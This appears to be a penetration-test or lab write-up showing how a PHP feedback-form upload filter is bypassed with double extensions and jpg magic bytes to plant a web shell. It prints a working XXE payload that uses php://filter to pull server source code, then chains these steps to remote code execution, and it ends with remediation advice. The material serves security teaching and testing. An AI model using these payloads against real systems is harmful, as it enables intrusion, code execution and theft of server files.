# File Upload Attack & Bypassing Filters to Achieve RCE

<br>

## Objective & Scope

<br>

The objective of this assessment is to evaluate the security posture of the application's file processing and feedback upload module. The primary goal is to analyze validation mechanisms, bypass backend restriction filters, achieve arbitrary code execution, and assess the impact on system confidentiality and integrity.

<br>

---

## Initial Reconnaissance & Information Gathering

<br>

The application has a feedback form and we can attach a file to it:

<br>

<img width="959" height="371" alt="image" src="https://github.com/user-attachments/assets/9efe9dc4-a0e1-411c-8be6-b01cb2c0ddaa" />

<br>

<br>

Before any attack we should understand how the application works. The file upload form accepts only `jpg`, `png` and `jpeg` extensions. It also applies `checkFile()` function to the file we upload:

<br>

<img width="959" height="392" alt="image" src="https://github.com/user-attachments/assets/b1732832-b8b5-4f2d-90e6-d5a42ea50b36" />

<br>

<br>

The function checks the extension of files we upload and if it does not match `jpg`, `png` or `jpeg`, we will get an error "Only images are allowed":

<br>

<img width="756" height="173" alt="image" src="https://github.com/user-attachments/assets/fc01c15a-4e08-4f8e-bc54-24afbace4429" />

<br>

<br>

```javascript
function checkFile(File) {
  var file = File.files[0];
  var filename = file.name;
  var extension = filename.split('.').pop();

  if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#upload_message').text("Only images are allowed");
    File.form.reset();
  } else {
    $("#inputGroupFile01").text(filename);
  }
}

$(document).ready(function () {
  $("#upload").click(function (event) {
    event.preventDefault();
    var fd = new FormData();
    var files = $('#uploadFile')[0].files[0];
    fd.append('uploadFile', files);

    if (!files) {
      $('#upload_message').text("Please select a file");
    } else {
      $.ajax({
        url: '/contact/upload.php',
        type: 'post',
        data: fd,
        contentType: false,
        processData: false,
        success: function (response) {
          if (response.trim() != '') {
            $("#upload_message").html(response);
          } else {
            window.location.reload();
          }
        },
      });
    }
  });
});
```

<br>

But this is a client-side validaton which can be easily bypassed by using a proxy or DOM-based manipulations. We will upload a `jpg` file and edit it with a proxy to see how back-end server validates the files we upload:

<br>

Submit button does not make a POST request:

<br>

<img width="857" height="206" alt="image" src="https://github.com/user-attachments/assets/b656dd5c-3e82-4a0e-bffd-88d01733defa" />

<br>

<br>

<img width="959" height="368" alt="image" src="https://github.com/user-attachments/assets/12dd4783-89bf-4e4c-8e58-ea2b8259dd85" />

<br>

<br>

The green button acts differently:

<br>

<img width="251" height="310" alt="image" src="https://github.com/user-attachments/assets/76ded0f9-2b27-4c2a-bca3-371c72738419" />

<br>

<br>

<img width="859" height="199" alt="image" src="https://github.com/user-attachments/assets/446094d2-e476-44f1-a05e-14640db0353a" />

<br>

<br>

This is the `POST` request we are going to work with. We will not blindly brute force different files. We have to figure out:

<br>

* What `Content-Type` is allowed?

<br>

* What `extensions` are allowed?

<br>

* Does a back-end server checks the MIME-type of the files we upload?

<br>


### Finding Valid Content-Type

<br>

<img width="647" height="282" alt="image" src="https://github.com/user-attachments/assets/2a8efce8-e1e3-46c9-a998-4132af005f78" />

<br>

<br>

<img width="662" height="310" alt="image" src="https://github.com/user-attachments/assets/7bb5b678-17cd-473b-abbd-a4a249b14fac" />

<br>

<br>

There are 6 `Content-Type` headers allowed (Length 49500) and now we understand that the back-end server validates it

<br>

### Finding Valid Extensions

<br>

<img width="656" height="308" alt="image" src="https://github.com/user-attachments/assets/70422188-1ed3-4f7f-8018-ea929750462e" />

<br>

<br>

<img width="659" height="291" alt="image" src="https://github.com/user-attachments/assets/093c8f74-10e2-4678-bd11-4b47a4db3869" />

<br>

<br>

Only 2 extensions ending `.jpg` and `.png` are allowed. Probably the back-end validates only the end of the file and does not blacklist all `php` extensions. We can try to use double extensions `cat.ext.jpg`: 

<br>

<img width="662" height="290" alt="image" src="https://github.com/user-attachments/assets/da546b5c-d87c-4241-aad6-20bfac6b826c" />

<br>

<br>

At this point we know the allowed `Content-Type` and `File extensions`. The next step is to create our web shell and upload it.

<br>

## Vulnerability Assessment & Filter Bypass

<br>

The server validates MIME-type of the files we upload and we got an error `Only images are allowed`:

<br>

<img width="719" height="287" alt="image" src="https://github.com/user-attachments/assets/02341d0f-7869-4f1b-b0a7-2cb9d1ea7612" />

<br>

<br>

To bypass this validation we need to create a file with `jpg` magic bytes at the beginning of it and insert our PHP code after:

<br>

<img width="719" height="290" alt="image" src="https://github.com/user-attachments/assets/eab33fff-9322-405a-af9b-5976527c0897" />

<br>

<br>

Our web shell is successfully uploaded

<br>


### Discovering the Upload Directory via XXE

<br>

To achieve Remote Code Execution, uploading the web shell is only the first half of the attack chain. We also need to identify the exact directory path where the file is stored and rendered on the server.

<br>

During the information gathering phase, we determined that the application accepts the `image/svg+xml` Content-Type. Because the backend XML parser has External Entity Processing enabled, it is vulnerable to XML External Entity `XXE injection`.

<br>

By exploiting this XXE vulnerability using PHP wrappers `php://filter`, we exfiltrated the Base64-encoded source code of `upload.php`:

<br>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> 
<svg>&xxe;</svg>
```

<br>

<img width="718" height="260" alt="image" src="https://github.com/user-attachments/assets/d056d690-6d0b-4ffe-a358-f7d8d17181bb" />

<br>

<br>

Decoding the exfiltrated source code revealed the exact server-side file naming scheme and storage path:

<br>

```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
echo "Extension not allowed";
die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
echo "Only images are allowed";
die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
echo "Only images are allowed";
die();
}
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
echo "File too large";
die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
displayHTMLImage($target_file);
} else {
echo "File failed to upload";
}
```
<br>

The source code confirmed that uploads are saved inside the `./user_feedback_submissions/` directory, prepended with the current date in `YYMMDD` format.

<br>

## Exploitation

<br>

Chaining all the information together we can construct the full URL to access our uploaded web shell and trigger execution:

<br>

<img width="731" height="73" alt="image" src="https://github.com/user-attachments/assets/d140195d-6cde-44f5-9b61-85c53768ae3f" />

<br>

<br>

As we can see, our PHP code executes alongside with `jpg` magic bytes:

<br>

<img width="1212" height="169" alt="image" src="https://github.com/user-attachments/assets/fd8fb514-7118-4493-b7f5-845a965a6eaf" />

<br>

<br>

<img width="1462" height="172" alt="image" src="https://github.com/user-attachments/assets/d126f47f-3db3-4445-b32e-147c404fe0c0" />

<br>

<br>


## Remediation Recommendations

<br>

To address the identified vulnerabilities and mitigate the risk of Remote Code Execution and sensitive file disclosure, the following remediation measures should be implemented:

<br>

* Implement Extension Validation - Whitelisting the allowed extensions and blacklisting dangerous extensions. With blacklisted extension, the web application checks if the extension exists anywhere within the file name, while with whitelists, the web application checks if the file name ends with the extension:

<br>

```php
if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

<br>

* Disable External Entity Processing (XXE Prevention) - Configure all back-end XML parsers to explicitly disable External Entity Resolution (`DTD` / `libxml_disable_entity_loader(true)`) and external DTD execution to prevent Local File Disclosure and server-side exfiltration.

 <br>

* Hide the uploads directory from the end-users and only allow them to download the uploaded files through a download page. Users should not have direct access to the uploads directory. Any direct requests to this directory should return a `403 Forbidden` response.

<br>

* Use security-focused HTTP headers - `Content-Disposition: attachment`, `Content-Type`, `X-Content-Type-Options: nosniff`

<br>

* Randomize the names of the uploaded files in storage and store their "sanitized" original names in a database.

<br>

* Store the uploaded files in a separate server or container. If an attacker can gain remote code execution, they would only compromise the uploads server, not the entire back-end server.

<br>

* Use `open_basedir` to prevent web applications from accessing files outside their restricted directories.

<br>

* Use `disable_functions` configurations in `php.ini` to disable `exec`, `shell_exec`, `system`, `passthru` functions.

<br>

*  Scan uploaded files for malware or malicious strings.

<br>

* Utilize a Web Application Firewall (WAF) as a secondary layer of protection.

<br>
